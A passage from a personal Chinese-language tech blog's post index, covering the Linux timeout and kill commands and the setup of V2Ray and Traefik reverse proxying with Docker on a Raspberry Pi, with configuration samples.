id=\"more\"></a>\n<p>使用方法很簡單</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">timeout 10 ping 127.0.0.1</span><br></pre></td></tr></table></figure>\n<p>詳細了解</p>\n<blockquote>\n<p>timeout [選項] 數字[後綴] 命令 [參數]…</p>\n<p>後綴」s」代表秒(默認值)，」m」代表分，」h」代表小時，」d」代表天。<br>選項詳解</p>\n<p>長選項必須使用的參數對於短選項時也是必需使用的。<br>  -s, –signal=信號<br>        指定在超時時發送的信號。信號可以是類似”HUP”的信號名或是信號數。<br>        查看”kill -l”以獲得信號列表<br>      –help        顯示此幫助信息並退出<br>      –version        顯示版本信息並退出</p>\n<p>如果程序超時則退出狀態數為124，否則返回程序退出狀態。<br>如果沒有指定信號則默認為TERM 信號。TERM 信號在進程沒有捕獲此信號時殺死進程。<br>對於另一些進程可能需要使用KILL (9)信號，當然此信號不能被捕獲。<br>————————————————<br>版权声明：本文为CSDN博主「Summer_ZJU」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/xiaqunfeng123/article/details/54315390\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/xiaqunfeng123/article/details/54315390</a></p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/xiaqunfeng123/article/details/54315390\" target=\"_blank\" rel=\"noopener\">Linux命令——timeout - 夏天的风 - CSDN博客</a></p>\n<h2 id=\"子程序-kill-探討\"><a href=\"#子程序-kill-探討\" class=\"headerlink\" title=\"子程序 kill 探討\"></a>子程序 kill 探討</h2><p>我好奇子程序會不會關掉<a href=\"https://malagege.github.io/blog/2019/10/03/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/\">如何在 Linux 殺掉(kill)子程序 | 程式狂想筆記</a><br>自從上次紀錄<br>我好奇子程序會不會關掉??<br>經過實驗結果<strong>會</strong><br>但很奇怪我好奇他怎麼會 kill 掉 子程序<br>經過我猜測，背景應該是使用<code>kill -- -$PGID</code>指令<br>所以子程序才會關掉</p>\n<h2 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h2><h3 id=\"安裝timeout指令\"><a href=\"#安裝timeout指令\" class=\"headerlink\" title=\"安裝timeout指令\"></a>安裝timeout指令</h3><p>安裝timeout指令(通常沒例外的時候，Linux應該會有)<br>coreutils<br><a href=\"https://stackoverflow.com/questions/20548460/timeout-command-not-found-in-linux-server\" target=\"_blank\" rel=\"noopener\">timeout –&gt; command not found in linux server - Stack Overflow</a></p>\n<h3 id=\"kill-2-就使-Ctrl-c\"><a href=\"#kill-2-就使-Ctrl-c\" class=\"headerlink\" title=\"kill -2 就使 Ctrl + c\"></a>kill -2 就使 Ctrl + c</h3><p>這一樣子程序都會被 kill 掉</p>\n<h3 id=\"nohup意思\"><a href=\"#nohup意思\" class=\"headerlink\" title=\"nohup意思\"></a>nohup意思</h3><h4 id=\"有關-nohup\"><a href=\"#有關-nohup\" class=\"headerlink\" title=\"有關 nohup\"></a>有關 nohup</h4><p>nohup 的全寫是 “no hangup”, HUP hangup (HUP) 訊號會在使用者登出時, 系統向 process 發出, 通知 process 結束, 但透過 nohup 執行的指令, nohup 會將 HUP 訊息截取, 讓指令可以繼續執行。<br><a href=\"https://www.opencli.com/linux/nohup-background-execute-command\" target=\"_blank\" rel=\"noopener\">nohup 指令 - 背景執行指令</a></p>\n<p>掛起信號【hang up】，終端斷線，經常在退出系統前使用，會終止進程。但是，一般啟動程序時為了讓程序繼續運行，會指定 nohup 就是為了不讓程序接收掛起信號而終止，這樣在退出系統時程序仍舊能正常運行<br><a href=\"https://www.playpi.org/2019042101.html\" target=\"_blank\" rel=\"noopener\">Linux 之 kill 命令入門實踐 | 蝦丸派</a></p>\n<p>參考連結:<br><a href=\"http://fibrevillage.com/sysadmin/237-ways-to-kill-parent-and-child-processes-in-one-command\" target=\"_blank\" rel=\"noopener\">Ways to kill parent and child processes in one command - Fibrevillage</a><br><a href=\"https://blog.csdn.net/Harry_lyc/article/details/53543928\" target=\"_blank\" rel=\"noopener\">Linux 中 Kill -2 和 Kill -9 的区别 - Harry的专栏 - CSDN博客</a><br><a href=\"https://blog.csdn.net/a1010256340/article/details/75253353\" target=\"_blank\" rel=\"noopener\">Linux中kill -2、kill -9等区别 &amp;&amp; kill signal汇总 - 天涯的浪子 - CSDN博客</a><br><a href=\"https://www.playpi.org/2019042101.html\" target=\"_blank\" rel=\"noopener\">Linux 之 kill 命令入门实践 | 虾丸派</a><br><a href=\"https://www.cnblogs.com/liuhouhou/p/5400540.html\" target=\"_blank\" rel=\"noopener\">Linux kill -9 和 kill -15 的区别 - 妖老山黑 - 博客园</a><br><a href=\"https://unix.stackexchange.com/questions/82724/ps-switches-to-display-pid-ppid-pgid-and-sid-collectively\" target=\"_blank\" rel=\"noopener\">process - ps switches to display PID, PPID, PGID, and SID collectively - Unix &amp; Linux Stack Exchange</a><br><a href=\"https://blog.csdn.net/zhuying_linux/article/details/7031573\" target=\"_blank\" rel=\"noopener\">kill -HUP pid - 小菜鸟的天地 - CSDN博客</a><br><a href=\"https://blog.csdn.net/xiaqunfeng123/article/details/54315390\" target=\"_blank\" rel=\"noopener\">Linux命令——timeout - 夏天的风 - CSDN博客</a><br><a href=\"https://stackoverflow.com/questions/13352388/running-php-script-as-cron-job-timeout-issues\" target=\"_blank\" rel=\"noopener\">Running php script as cron job - timeout issues? - Stack Overflow</a></p>\n","categories":["Linux"],"tags":["linux","kill"]},{"title":"在 Raspberry Pi 建置 V2ray","url":"/blog/2021/03/28/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/","content":"<p>最近想讓樹莓派做 VPN<br>後來有找到這個<br>不同VPN使用方法，這個有點像做代理<br>後來選這個是因為做 https 可以用 traefik 做更新憑證<br>這樣我就可以省一步</p>\n<a id=\"more\"></a>\n<h2 id=\"前言廢話\"><a href=\"#前言廢話\" class=\"headerlink\" title=\"前言廢話\"></a>前言廢話</h2><p><a href=\"https://github.com/alphacodinghub/v2ray-nginx-docker\" target=\"_blank\" rel=\"noopener\">GitHub - alphacodinghub/v2ray-nginx-docker: Easy Docker deployment for V2ray + WS +TLS with Nginx, free SSL and Traefik</a><br>這邊有實例出來<br>但我在 build 出錯了…</p>\n<p>查看實做一個V2ray 跑<br><a href=\"https://toutyrater.github.io/app/docker-deploy-v2ray.html\" target=\"_blank\" rel=\"noopener\">Docker 部署 V2Ray · V2Ray 配置指南|V2Ray 白话文教程</a><br>好像沒什麼難度<br>不如自己試試看</p>\n<p>意外這個在 Raspberry PI 也能跑<br>如果我猜的沒錯，這個掛在 Traefik 應該也能跑</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run v2fly/v2fly-core</span><br></pre></td></tr></table></figure>\n<h2 id=\"設定實做\"><a href=\"#設定實做\" class=\"headerlink\" title=\"設定實做\"></a>設定實做</h2><p>參考設定:<a href=\"https://toutyrater.github.io/advanced/wss_and_web.html\" target=\"_blank\" rel=\"noopener\">WebSocket+TLS+Web · V2Ray 配置指南|V2Ray 白话文教程</a></p>\n<p>建立 config.conf<br><figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"inbounds\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"port\"</span>: <span class=\"number\">10000</span>,</span><br><span class=\"line\">      \"listen\":\"0.0.0.0\",//這邊原本是127.0.0.1，因為要讓traefik 做反向代理，所以設為0.0.0.0</span><br><span class=\"line\">      \"protocol\": \"vmess\",</span><br><span class=\"line\">      \"settings\": &#123;</span><br><span class=\"line\">        \"clients\": [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            \"id\": \"b831381d-6324-4e53-ad4f-8cda48b30811\", //建議更換 </span><br><span class=\"line\">            \"alterId\": 64</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      \"streamSettings\": &#123;</span><br><span class=\"line\">        \"network\": \"ws\",</span><br><span class=\"line\">        \"wsSettings\": &#123;</span><br><span class=\"line\">        \"path\": \"/ray\"</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  \"outbounds\": [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"freedom\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"settings\"</span>: &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 這邊可以測試看看能不能跑</span></span><br><span class=\"line\"> docker run --rm    -v `<span class=\"built_in\">pwd</span>`/config.json:/etc/v2ray/config.json v2fly/v2fly-core</span><br></pre></td></tr></table></figure>\n<p>測試可以跑</p>\n<p>我改寫程 docker compose 執行</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">\"2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  v2ray_home:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">v2fly/v2fly-core</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">TZ=Asia/Taipei</span></span><br><span class=\"line\"><span class=\"attr\">    expose:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"10000\"</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">traefik_network</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.v2ray-https.rule=Host(`pekachu.xxxxxxxx.org`)\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.v2ray-https.tls=true\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  traefik_network:</span></span><br><span class=\"line\"><span class=\"attr\">    external:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>client 設定</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"inbounds\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"port\"</span>: <span class=\"number\">1080</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"listen\"</span>: <span class=\"string\">\"127.0.0.1\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"socks\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"sniffing\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"enabled\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"destOverride\"</span>: [<span class=\"string\">\"http\"</span>, <span class=\"string\">\"tls\"</span>]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"attr\">\"settings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"auth\"</span>: <span class=\"string\">\"noauth\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"udp\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"outbounds\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"vmess\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"settings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"vnext\"</span>: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"address\"</span>: <span class=\"string\">\"pekachu.xxxxxxxx.org\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"port\"</span>: <span class=\"number\">443</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"users\"</span>: [</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                \"id\": \"b831381d-6324-4e53-ad4f-8cda48b30811\", // 這邊id 需要跟 server 一樣，就等於是密碼</span><br><span class=\"line\">                \"alterId\": 64</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            ]</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      \"streamSettings\": &#123;</span><br><span class=\"line\">        \"network\": \"ws\",</span><br><span class=\"line\">        \"security\": \"tls\",</span><br><span class=\"line\">        \"wsSettings\": &#123;</span><br><span class=\"line\">          \"path\": \"/ray\"</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>簡單備註</p>\n<ol>\n<li>UUID 可更換用<a href=\"https://www.uuidgenerator.net/\" target=\"_blank\" rel=\"noopener\">Online UUID Generator Tool</a>網站</li>\n<li>address 需要放對印網址(DNS)</li>\n</ol>\n<p>要連需要設定代理 sockv5 127.0.0.1 port: 10801(看v2ray client port設多少)<br>我是使用 v2rayN<br>相關設定可以看<a href=\"https://blog.yosheng.tw/v2ray-client\" target=\"_blank\" rel=\"noopener\">跨越長城 V2Ray Client - 夜升筆談</a></p>\n<p>用瀏覽器執行</p>\n<h2 id=\"相關文章\"><a href=\"#相關文章\" class=\"headerlink\" title=\"相關文章\"></a>相關文章</h2><p><a href=\"https://lightyearvpn.com/zh-TW/blog/shadowsocks-vs-v2ray-vs-trojan-for-gfw\" target=\"_blank\" rel=\"noopener\">Shadowsocks vs V2Ray vs Trojan 都有什么区别？ - LightyearVPN</a></p>\n<p><a href=\"https://ppundsh.github.io/posts/e457/\" target=\"_blank\" rel=\"noopener\">V2Ray 記錄 | Flymia 凡事用心之事</a><br>裡面還滿多設定的，可以參考參考</p>\n<p><a href=\"https://www.v2ray.com/awesome/tools.html\" target=\"_blank\" rel=\"noopener\">神一样的工具们 · Project V 官方网站</a><br>裡面有線上config 產生器</p>\n<p><a href=\"https://www.youtube.com/watch?v=G2eXQrgq_n8\" target=\"_blank\" rel=\"noopener\">v2ray揭秘：速度最快的v2ray客户端 V2RayN V2RayW Clash Qv2ray Mellow （v2ray翻墙速度测试） - YouTube</a><br>Client 比較</p>\n<p><a href=\"https://v2raytech.com/clash-for-windows-v2ray-tutorial/\" target=\"_blank\" rel=\"noopener\">Clash for Windows配置V2ray教程 - V2ray科技</a><br>設個好像有做系統底層代理…不過我沒測試</p>\n","categories":["VPN"],"tags":["v2ray"]},{"title":"在 Raspberry PI 架設 Traefik 初體驗","url":"/blog/2020/10/13/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<p>最近在樹梅派使用 Docker 服務多<br>常常設完一個服務，我就要去Virtual Server 設定一個 port<br>最後想到可以架一個 Server 做反向代理<br>這時候我想到 nginx 和 caddy<br>caddy 又可以幫我換 letsencrypt 憑證<br>最後看到這篇<a href=\"https://blog.wu-boy.com/2019/01/deploy-service-using-traefik-and-docker/\" target=\"_blank\" rel=\"noopener\">用 Traefik 搭配 Docker 快速架設服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY</a></p>\n<blockquote>\n<p>我要介紹另外一套工具叫 Traefik，這一套也是用 Go 語言開發，而我推薦這套的原因是，此套可以跟 Docker 很深度的結合，只要服務跑在 Docker 上面，Traefik 都可以自動偵測到，並且套用設定。透過底下的範例讓 Traefik 串接後端兩個服務，分別是 domain1.com 及 domain2.com。</p>\n</blockquote>\n<p>好像能試試看喔</p>\n<a id=\"more\"></a>\n<h2 id=\"事前準備\"><a href=\"#事前準備\" class=\"headerlink\" title=\"事前準備\"></a>事前準備</h2><h3 id=\"docker-compose\"><a href=\"#docker-compose\" class=\"headerlink\" title=\"docker-compose\"></a>docker-compose</h3><p>我發現我樹梅派沒安裝 docker-compose</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip3 install docker-compose</span><br></pre></td></tr></table></figure>\n<p>安裝就這麼簡單</p>\n<h3 id=\"修改舊的-dockerfile\"><a href=\"#修改舊的-dockerfile\" class=\"headerlink\" title=\"修改舊的 dockerfile\"></a>修改舊的 dockerfile</h3><p>發現有人做過<br><a href=\"https://juejin.im/entry/6844903458986786830\" target=\"_blank\" rel=\"noopener\">Docker 与 Traefik 助微服务腾飞 - 后端</a><br>不過版本是1.3.8<br>現在出到 2 了<br>想使用新版本<br>看一下舊版的 dockerfile<br>只是下載直接執行<br><a href=\"https://github.com/hypriot/rpi-traefik/blob/master/Dockerfile\" target=\"_blank\" rel=\"noopener\">rpi-traefik/Dockerfile at master · hypriot/rpi-traefik</a></p>\n<p><del>PS: Dockerfile ADD 可以放 http 以外，他可以放 gz 連結，會自動解壓縮</del><br><a href=\"https://islishude.github.io/blog/2019/06/29/docker/Dockerfile-COPY-%E5%92%8C-ADD-%E6%8C%87%E4%BB%A4%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%BF%E7%94%A8%E8%A7%84%E5%88%99/\" target=\"_blank\" rel=\"noopener\">Dockerfile COPY 和 ADD 指令區別和使用規則 - Lishude’s Web Note</a></p>\n<blockquote>\n<p>上面的命令會導致foo.tar.gz歸檔文件的內容被解壓到容器的/ tmp目錄中。 有趣的是，URL下載和解壓功能不能一起使用。任何通過URL複製的壓縮文件都不會自動解壓縮。<br><a href=\"https://juejin.im/post/6844903574539862030\" target=\"_blank\" rel=\"noopener\">Dockerfile:ADD VS COPY</a></p>\n</blockquote>\n<blockquote>\n<p>ADD的另外一個特性是有能力自動解壓文件。如果<src>參數是一個可識別的壓縮格式（tar, gzip, bzip2, etc）的本地文件（所以實現不了同時下載並解壓），就會被解壓到指定容器文件系統的路徑<dest>。<br>ADD /foo.tar.gz /tmp/<br>上述指令會使foo.tar.gz壓縮文件解壓到容器的/tmp目錄。<br>URL下載和解壓特性不能一起使用。任何壓縮文件通過URL拷貝，都不會自動解壓。<br>目前ADD指令有點讓人迷惑，有時候解壓文件，有時候不解壓文件，如果你想拷貝一個壓縮文件，你會以為地解壓。如果文件是某種不能識別的壓縮文件，如果你想解壓，你又會意外地複製它。<br><a href=\"https://www.cnblogs.com/zdz8207/p/linux-docker-add-copy.html\" target=\"_blank\" rel=\"noopener\">docker Dockerfile指令ADD和COPY的區別，添加目錄方法 - 大自然的流風 - 博客園</a></dest></src></p>\n</blockquote>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> hypriot/rpi-alpine:<span class=\"number\">3.6</span></span><br><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"bash\"> https://github.com/traefik/traefik/releases/download/v2.3.1/traefik_v2.3.1_linux_armv7.tar.gz /traefik.tar.gz</span></span><br><span class=\"line\"><span class=\"bash\">RUN tar zxvf traefik.tar.gz</span></span><br><span class=\"line\"><span class=\"bash\">RUN apk upgrade --no-cache &amp;&amp;\\</span></span><br><span class=\"line\"><span class=\"bash\">    apk add --no-cache ca-certificates &amp;&amp;\\</span></span><br><span class=\"line\"><span class=\"bash\">    chmod +x /traefik</span></span><br><span class=\"line\"><span class=\"bash\">EXPOSE 80 8080 443</span></span><br><span class=\"line\"><span class=\"bash\">ENTRYPOINT [<span class=\"string\">\"/traefik\"</span>]</span></span><br></pre></td></tr></table></figure>\n<p>做到後面，我發現有現成的 Image<br><a href=\"https://hub.docker.com/r/arm64v8/traefik\" target=\"_blank\" rel=\"noopener\">arm64v8/traefik - Docker Hub</a></p>\n<h2 id=\"Raspberry-PI-安裝-traefik\"><a href=\"#Raspberry-PI-安裝-traefik\" class=\"headerlink\" title=\"Raspberry PI 安裝 traefik\"></a>Raspberry PI 安裝 traefik</h2><p>docker build . -t traefik</p>\n<h3 id=\"建立-network\"><a href=\"#建立-network\" class=\"headerlink\" title=\"建立 network\"></a>建立 network</h3><p>docker network create traefik_network</p>\n<h3 id=\"建置-docker-compose\"><a href=\"#建置-docker-compose\" class=\"headerlink\" title=\"建置 docker-compose\"></a>建置 docker-compose</h3><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  traefik:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">traefik</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"bullet\">--api.insecure=true</span> <span class=\"bullet\">--providers.docker</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"80:80\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"8080:8080\"</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">traefik_network</span></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  traefik_network:</span></span><br><span class=\"line\"><span class=\"attr\">    external:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"建置-whoami\"><a href=\"#建置-whoami\" class=\"headerlink\" title=\"建置 whoami\"></a>建置 whoami</h3><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">\"2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  whoami:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">hypriot/rpi-whoami</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">        -</span> <span class=\"string\">traefik_network</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span></span><br><span class=\"line\"><span class=\"attr\">      - constraint:</span><span class=\"string\">hypriot.hierarchy!=leader</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">PORT=8000</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.backend=whoami\"</span></span><br><span class=\"line\"><span class=\"comment\">#      - \"traefik.frontend.rule=Host:whoami.docker.localhost\"</span></span><br><span class=\"line\"><span class=\"comment\">#2.3.1 上面設定好像會無效</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.router0.rule=Host(`whoami.localhost`) || PathPrefix(`/whoami`)\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.port=8000\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  traefik_network:</span></span><br><span class=\"line\"><span class=\"attr\">    external:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"測試方法\"><a href=\"#測試方法\" class=\"headerlink\" title=\"測試方法\"></a>測試方法</h2><h3 id=\"方法1-修改hosts檔案\"><a href=\"#方法1-修改hosts檔案\" class=\"headerlink\" title=\"方法1:修改hosts檔案\"></a>方法1:修改hosts檔案</h3><p>/etc/hosts</p>\n<p>127.0.0.1    whoami.localhost</p>\n<h3 id=\"方法2-curl-H-xxx\"><a href=\"#方法2-curl-H-xxx\" class=\"headerlink\" title=\"方法2: curl -H xxx\"></a>方法2: curl -H xxx</h3><p>curl -H Host:whoami.localhost <a href=\"http://192.168.1.1/\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/</a></p>\n<p><a href=\"https://juejin.im/entry/6844903458986786830\" target=\"_blank\" rel=\"noopener\">Docker 与 Traefik 助微服务腾飞 - 后端</a><br>裡面適用這個方法</p>\n<p>推薦使用這個，這樣就不用做多餘的設定</p>\n<p>舊版本差異<br><a href=\"https://doc.traefik.io/traefik/migration/v1-to-v2/\" target=\"_blank\" rel=\"noopener\">Traefik v1 to v2 - Traefik</a></p>\n<p><a href=\"https://shanyue.tech/op/traefik.html#%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B\" target=\"_blank\" rel=\"noopener\">traefik 简易入门 | 个人服务器运维指南 | 山月行</a><br><a href=\"https://hub.docker.com/r/arm32v6/traefik/\" target=\"_blank\" rel=\"noopener\">arm32v6/traefik - Docker Hub</a><br><a href=\"https://doc.traefik.io/traefik/\" target=\"_blank\" rel=\"noopener\">Traefik</a><br><a href=\"https://blog.wu-boy.com/2019/01/deploy-service-using-traefik-and-docker/\" target=\"_blank\" rel=\"noopener\">用 Traefik 搭配 Docker 快速架設服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY</a><br><a href=\"https://blog.wu-boy.com/2019/03/setup-traefik-with-drone-ci-cd-in-ten-minutes/\" target=\"_blank\" rel=\"noopener\">10 分鐘內用 Traefik 架設 Drone 搭配 GitHub 服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY</a><br><a href=\"https://blanboom.org/2019/traefik-and-wildcard-cert-on-my-website/\" target=\"_blank\" rel=\"noopener\">个人网站实现方案更新：Traefik 反向代理、与 NAS 共用 Wildcard 证书等 – Blanboom</a></p>\n<blockquote>\n<p>當我們訪問集群內部服務，如數據庫，緩存，traefik Dashboard，gitlab 時，如果直接暴露在公網中，則會造成很大安全隱患，此時我們應該如何處理呢？</p>\n</blockquote>\n<p><a href=\"https://shanyue.tech/op/traefik.html#%E6%80%BB%E7%BB%93\" target=\"_blank\" rel=\"noopener\">traefik 簡易入門 | 個人服務器運維指南 | 山月行</a></p>\n<p><a href=\"https://www.mdeditor.tw/pl/p8UD/zh-tw\" target=\"_blank\" rel=\"noopener\">一文搞懂 Traefik2.1 的使用_River’s Site - MdEditor</a><br><a href=\"https://zhuanlan.zhihu.com/p/61967315\" target=\"_blank\" rel=\"noopener\">使用 Docker 和 Traefik 搭建 GitLab （前篇） - 知乎</a><br><a href=\"https://www.jianshu.com/p/3ea76663243b\" target=\"_blank\" rel=\"noopener\">在Docker Swarm上部署Traefik2.x - 简书</a></p>\n<h2 id=\"traefik-綁定-lets-wildcard\"><a href=\"#traefik-綁定-lets-wildcard\" class=\"headerlink\" title=\"traefik 綁定 lets wildcard\"></a>traefik 綁定 lets wildcard</h2><p>wildcard 只能用 dns chang</p>\n<h3 id=\"註銷舊有憑證方法\"><a href=\"#註銷舊有憑證方法\" class=\"headerlink\" title=\"註銷舊有憑證方法\"></a>註銷舊有憑證方法</h3><p>沒用的跳過<br>certbot revoke –cert-path /etc/letsencrypt/archive/${YOUR_DOMAIN}/cert1.pem</p>\n<p>不過後來沒是成功<br>我先把nextcloud 綁下來<br>感覺不能直接這樣做??<br>後來想說直接用新的 url</p>\n<h3 id=\"設定\"><a href=\"#設定\" class=\"headerlink\" title=\"設定\"></a>設定</h3><h4 id=\"acme-json\"><a href=\"#acme-json\" class=\"headerlink\" title=\"acme.json\"></a>acme.json</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在docker-compose.yml 路徑</span></span><br><span class=\"line\">touch acme.json &amp;&amp; chmod 600 acme.json</span><br></pre></td></tr></table></figure>\n<h4 id=\"設定-traefik-docker-compose\"><a href=\"#設定-traefik-docker-compose\" class=\"headerlink\" title=\"設定 traefik docker-compose\"></a>設定 traefik docker-compose</h4><p>參考這個<a href=\"https://github.com/KnicKnic/traefik_duckdns/blob/master/docker-compose.yml\" target=\"_blank\" rel=\"noopener\">traefik_duckdns/docker-compose.yml at master · KnicKnic/traefik_duckdns</a></p>\n<p>對應我的 docker-compose 做修改</p>\n<figure class=\"highlight plain\"><figcaption><span>.env</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">#your duck dns token</span><br><span class=\"line\">DUCKDNS_TOKEN=</span><br><span class=\"line\"></span><br><span class=\"line\">#your duck dns subdomain (not the full domain)</span><br><span class=\"line\">#use &quot;test&quot; not &quot;test.duckdns.org</span><br><span class=\"line\">DUCKDNS_SUBDOMAIN=</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'3'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  updateDuckDNSIP:</span></span><br><span class=\"line\">    <span class=\"comment\"># used to update 